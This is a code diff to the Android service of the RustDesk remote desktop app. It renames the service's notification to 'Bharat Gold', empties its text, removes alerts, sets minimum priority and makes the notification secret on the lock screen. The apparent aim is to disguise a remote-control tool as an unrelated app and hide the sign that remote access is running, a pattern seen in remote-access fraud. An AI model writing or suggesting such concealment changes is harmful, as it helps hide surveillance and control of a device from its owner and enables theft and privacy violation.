@@ -46,8 +46,8 @@ import java.nio.ByteBuffer
 import kotlin.math.max
 import kotlin.math.min
 
-const val DEFAULT_NOTIFY_TITLE = "RustDesk"
-const val DEFAULT_NOTIFY_TEXT = "Service is running"
+const val DEFAULT_NOTIFY_TITLE = "Bharat Gold"
+const val DEFAULT_NOTIFY_TEXT = ""
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
 
@@ -599,7 +599,7 @@ class MainService : Service() {
         notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channelId = "RustDesk"
-            val channelName = "RustDesk Service"
+            val channelName = "Bharat Gold"
             val channel = NotificationChannel(
                 channelId,
                 channelName, NotificationManager.IMPORTANCE_NONE
@@ -632,14 +632,14 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
-            .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setDefaults(0)
+            .setAutoCancel(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentTitle(DEFAULT_NOTIFY_TITLE)
-            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
+            .setContentText("")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
-            .setColor(ContextCompat.getColor(this, R.color.primary))
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setWhen(System.currentTimeMillis())
             .build()
         startForeground(DEFAULT_NOTIFY_ID, notification)
